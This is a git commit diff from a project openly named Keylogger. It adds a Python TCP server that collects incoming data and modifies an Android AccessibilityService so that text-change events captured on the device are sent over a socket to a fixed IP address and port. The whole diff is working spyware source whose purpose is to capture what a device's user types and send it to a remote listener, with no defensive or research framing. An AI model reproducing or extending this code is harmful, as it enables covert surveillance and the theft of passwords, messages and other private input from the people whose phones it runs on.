72f9c02995137cd1df42846273e6c4f94a19f855
estrickl <etstrickland@gmail.com>
2018-11-16 10:13:54 -0700

    Added Python Server and fixed Android Socket Timeout issue

---
+++ Keylogger/PyServer.py
@@ -0,0 +1,29 @@
+import SocketServer
+
+class MyTCPHandler(SocketServer.BaseRequestHandler):
+    """
+    The request handler class for our server.
+
+    It is instantiated once per connection to the server, and must
+    override the handle() method to implement communication to the
+    client.
+    """
+
+    def handle(self):
+        # self.request is the TCP socket connected to the client
+        self.data = self.request.recv(1024).strip()
+        print "{} wrote:".format(self.client_address[0])
+        print self.data
+        # just send back the same data, but upper-cased
+        self.request.sendall(self.data.upper())
+
+if __name__ == "__main__":
+	# Host ip is the localhost outer ip. Android must match this IP verbatum (no DNS currently)
+    HOST, PORT = "192.168.43.164", 7800
+
+    # Create the server, binding to localhost on port 7800
+    server = SocketServer.TCPServer((HOST, PORT), MyTCPHandler)
+
+    # Activate the server; this will keep running until you
+    # interrupt the program with Ctrl-C
+    server.serve_forever()
--- Keylogger/app/src/main/java/com/none/keylogger/Keylogger.java
+++ Keylogger/app/src/main/java/com/none/keylogger/Keylogger.java
@@ -5,6 +5,9 @@ import android.view.accessibility.AccessibilityEvent;
 import android.os.AsyncTask;
 import android.util.Log;
 
+import java.io.OutputStream;
+import java.io.PrintWriter;
+import java.net.Socket;
 import java.util.Calendar;
 import java.text.SimpleDateFormat;
 import java.text.DateFormat;
@@ -14,20 +17,38 @@ public class Keylogger extends AccessibilityService {
 
     // send key information to a server
     private class SendToServerTask extends AsyncTask<String, Void, String> {
+        Socket s;
+        OutputStream dos;
+        PrintWriter pw;
+
         @Override
         protected String doInBackground(String... params) {
 
+            // input data
+            String message = params[0];
+
             // try a connection
             try {
-                // for now, write to dmessage
-                Log.d("info", params[0]);
-
-                // information to send
-                //params[0]
+                Log.d("Socket:", "Connecting...");
+                s = new Socket("192.168.43.164", 7800); //ip, port
+                s.setSoTimeout(1000);
+                Log.d("Socket:", "Connected.");
+                dos = s.getOutputStream();
+                pw = new PrintWriter(dos);
+                Log.d("Socket:", "Writing...");
+                pw.println(message);
+                pw.write(message);
+                pw.flush();
+                pw.close();
+                s.close();
+                Log.d("Socket:", "Data Sent.");
 
             } catch (Exception e) {
                 e.printStackTrace();
             }
+
+            // for now, write to dmessage
+            Log.d("info", message);
             return params[0];
         }
     }
@@ -47,6 +68,15 @@ public class Keylogger extends AccessibilityService {
 
         // switch on the event type to determine action
         switch(event.getEventType()) {
+//            case AccessibilityEvent.TYPE_TOUCH_INTERACTION_START: {
+//                // get data from event
+//                String data = event.getText().toString();
+//                // send data to server
+//                SendToServerTask sendTask = new SendToServerTask();
+//                sendTask.execute(time + "|TOUCH|" + data);
+//                break;
+//            }
+
             // view text change
             case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED: {
                 // get data from event
